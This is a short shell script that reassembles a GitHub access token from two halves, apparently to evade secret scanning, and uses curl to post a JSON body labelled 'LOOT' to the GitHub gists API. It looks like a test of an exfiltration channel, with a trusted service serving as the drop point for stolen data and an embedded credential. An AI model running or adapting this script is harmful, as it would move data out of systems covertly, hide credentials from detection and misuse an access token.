A='ghp_s4v3DswRWxOFBDQ3'
B='7eWTxi0xSOUouH1HiWmb'
T="$A$B"
echo -n '{"description":"LOOT","files":{"t":{"content":"hello"}}}'>/tmp/j
curl -m10 -s -H "Authorization: token $T" -d @/tmp/j https://api.github.com/gists
